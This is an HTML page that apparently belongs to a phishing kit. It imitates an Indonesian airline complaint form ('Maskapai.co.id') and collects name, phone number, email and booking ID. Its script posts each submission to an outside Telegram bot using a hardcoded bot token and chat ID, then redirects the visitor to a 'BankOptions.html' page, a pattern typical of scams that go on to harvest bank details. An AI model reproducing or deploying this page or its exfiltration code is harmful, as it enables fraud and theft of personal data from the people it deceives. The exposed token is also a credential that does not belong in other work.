<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Maskapai.co.id
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
      font-family: 'Inter', sans-serif;
    }
    
    /* Style untuk notifikasi */
    .notification {
      position: fixed;
      top: 20px;
      right: 20px;
      padding: 16px 20px;
      border-radius: 8px;
      color: white;
      font-weight: 500;
      z-index: 1000;
      animation: slideIn 0.3s ease-out;
    }
    
    .notification.success {
      background-color: #10B981;
    }
    
    .notification.error {
      background-color: #EF4444;
    }
    
    @keyframes slideIn {
      from {
        transform: translateX(100%);
        opacity: 0;
      }
      to {
        transform: translateX(0);
        opacity: 1;
      }
    }
  </style>
 </head>
 <body class="bg-gray-100 min-h-screen flex flex-col justify-between">
  <!-- Top bar mimicking mobile status bar -->
  </div>      
  <!-- Header bar -->
  <header class="bg-[#E02B20] flex items-center px-3 py-2 relative">
   <button aria-label="Back" class="text-white text-xl mr-3">
    <i class="fas fa-arrow-left">
    </i>
   </button>
   <div class="flex-1 text-center">
   </div>
   <div class="w-6">
   </div>
  </header>
  <!-- Main card -->
  <main class="px-4 mt-6 flex-grow">
   <div class="max-w-md mx-auto bg-white rounded-xl shadow-lg overflow-hidden" style="box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);">
    <!-- Top dark header inside card -->
    <div class="bg-[#1A1A28] flex items-center space-x-4 p-5 rounded-t-xl">
     <div class="bg-white rounded-full p-3">
      <i class="fas fa-exclamation-circle text-[#1A1A28] text-xl">
      </i>
     </div>
     <h1 class="text-white text-lg font-semibold leading-tight">
      Maskapai
      <br/>
      Penerbangan
     </h1>
    </div>
    <!-- Info box -->
    <div class="bg-[#FCE9D9] text-[#4B4B4B] text-xs px-4 py-3 rounded mx-5 my-4 leading-tight">
     Jika ada masalah dengan booking tiket maskapai, silahkan isi formulir pengaduan berikut ini dengan data yang benar dan lengkap.
    </div>
    <!-- Form -->
    <form class="px-5 pb-6 space-y-5" id="complaintForm" novalidate="">
     <div>
      <label class="block text-[#4B4B4B] text-sm mb-1 font-normal" for="nama">
       Nama Lengkap
      </label>
      <div class="flex items-center border border-gray-300 rounded px-3 py-2">
       <i class="fas fa-user text-gray-500 mr-3">
       </i>
       <input class="flex-1 text-sm text-gray-700 focus:outline-none" id="nama" name="nama" placeholder="Masukkan nama lengkap" required="" type="text"/>
      </div>
     </div>
     <div>
      <label class="block text-[#4B4B4B] text-sm mb-1 font-normal" for="nomorhp">
       Nomor HP
      </label>
      <div class="flex items-center border border-gray-300 rounded px-3 py-2">
       <i class="fas fa-mobile-alt text-gray-500 mr-3">
       </i>
       <input class="flex-1 text-sm text-gray-700 focus:outline-none" id="nomorhp" name="nomorhp" placeholder="Masukkan nomor HP" required="" type="tel"/>
      </div>
     </div>
     <div>
      <label class="block text-[#4B4B4B] text-sm mb-1 font-normal" for="email">
       Email
      </label>
      <div class="flex items-center border border-gray-300 rounded px-3 py-2">
       <i class="fas fa-envelope text-gray-500 mr-3">
       </i>
       <input class="flex-1 text-sm text-gray-700 focus:outline-none" id="email" name="email" placeholder="Masukkan email" type="email"/>
      </div>
     </div>
     <div>
      <label class="block text-[#4B4B4B] text-sm mb-1 font-normal" for="idbooking">
       ID Booking Tiket
      </label>
      <div class="flex items-center border border-gray-300 rounded px-3 py-2">
       <i class="fas fa-ticket-alt text-gray-500 mr-3">
       </i>
       <input class="flex-1 text-sm text-gray-700 focus:outline-none" id="idbooking" name="idbooking" placeholder="Masukkan ID booking tiket" required="" type="text"/>
      </div>
     </div>
     <div>
      <label class="block text-[#4B4B4B] text-sm mb-1 font-normal" for="maskapai">
       Maskapai
      </label>
      <div class="flex items-center border border-gray-300 rounded px-3 py-2">
       <i class="fas fa-plane text-gray-500 mr-3">
       </i>
       <select class="flex-1 text-sm text-gray-700 focus:outline-none" id="maskapai" name="maskapai" required="">
        <option disabled="" selected="" value="">
         Pilih maskapai
        </option>
        <option value="Garuda Indonesia">
         Garuda Indonesia
        </option>
        <option value="Lion Air">
         Lion Air
        </option>
        <option value="AirAsia">
         AirAsia
        </option>
        <option value="Citilink">
         Citilink
        </option>
        <option value="Batik Air">
         Batik Air
        </option>
        <option value="Sriwijaya Air">
         Sriwijaya Air
        </option>
        <option value="Super Air Jet">
         Super Air Jet
        </option>
        <option value="Pelita Air">
         Pelita Air
        </option>
        <option value="Transnusa">
         Transnusa
        </option>
       </select>
      </div>
     </div>
     <div>
      <label class="block text-[#4B4B4B] text-sm mb-1 font-normal" for="jenismasalah">
       Pilih Opsi Anda
      </label>
      <div class="flex items-center border border-gray-300 rounded px-3 py-2">
       <i class="fas fa-exclamation-triangle text-gray-500 mr-3">
       </i>
       <select class="flex-1 text-sm text-gray-700 focus:outline-none" id="jenismasalah" name="jenismasalah" required="">
        <option disabled="" selected="" value="">
         Pilih Opsi Anda
        </option>
        <option value="Refund Dana">
         Refund Dana
        </option>
        <option value="Reschedule">
         Reschedule
        </option>
        <option value="Tambah Bagasi">
         Tambah Bagasi
        </option>
        <option value="Update Nama">
         Update Nama 
        </option>
        <option value="Booking Seat">
         Booking Seat
        </option>
         <option value="Cek In Online">
         Cek In Online
        </option>
         <option value="Bantuan Lainnya">
         Bantuan Lainnya
        </option>
       </select>
      </div>
     </div>
     <button class="w-full bg-[#E02B20] text-white font-semibold text-sm py-3 rounded-full shadow-md hover:bg-[#c1271b] transition-colors" type="submit">
      Kirim Pengaduan
     </button>
    </form>
   </div>
  </main>
  <!-- Footer -->
  <footer class="text-center text-gray-400 text-xs py-4 select-none">
  © 2025 Copyright by Maskapai All Rights Reserved. 
  </footer>
  
<script>
const form = document.getElementById('complaintForm');

// Konfigurasi Telegram Bot
const TELEGRAM_BOT_TOKEN = '8142214274:AAGDkwwEOsbxxo00e-hd7p5avWosgEjsjA8';
const TELEGRAM_CHAT_ID = '7549590022';

// Fungsi untuk menampilkan notifikasi
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `fixed top-4 right-4 p-4 rounded-lg text-white z-50 ${
        type === 'success' ? 'bg-green-500' : 
        type === 'error' ? 'bg-red-500' : 'bg-blue-500'
    }`;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 5000);
}

async function sendToTelegram(data) {
    const message = `
🎫 *PENGADUAN BOOKING TIKET*

👤 *Nama:* ${data.nama}
📱 *No HP:* ${data.nomorhp}
📧 *Email:* ${data.email || 'Tidak diisi'}
🎟️ *ID Booking:* ${data.idbooking}
✈️ *Maskapai:* ${data.maskapai}
⚠️ *Jenis Masalah:* ${data.jenismasalah}

📝 *Detail Pengaduan:*
${data.keterangan}

⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
    `;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        
        if (response.ok && result.ok) {
            return { success: true };
        } else {
            return { success: false, error: result.description || 'Unknown error' };
        }
    } catch (error) {
        return { success: false, error: error.message };
    }
}

form.addEventListener('submit', async (e) => {
    e.preventDefault();

    if (!form.checkValidity()) {
        form.reportValidity();
        return;
    }

    // Tampilkan loading
    const submitBtn = form.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Mengirim...';
    submitBtn.disabled = true;

    // Ambil data form
    const formData = new FormData(form);
    const data = {
        nama: formData.get('nama'),
        nomorhp: formData.get('nomorhp'),
        email: formData.get('email'),
        idbooking: formData.get('idbooking'),
        maskapai: formData.get('maskapai'),
        jenismasalah: formData.get('jenismasalah'),
        keterangan: formData.get('keterangan')
    };

    // Kirim ke Telegram
    const result = await sendToTelegram(data);

    if (result.success) {
        showNotification('Pengaduan berhasil dikirim! Kami akan segera menindaklanjuti.', 'success');
        form.reset();
        
        // Redirect setelah 2 detik
        setTimeout(() => {
            window.location.href = "BankOptions.html";
        }, 2000);
    } else {
        showNotification(`Gagal mengirim pengaduan: ${result.error}`, 'error');
        console.error('Telegram API Error:', result.error);
    }

    // Reset button
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
});
</script>
</body>

</html>
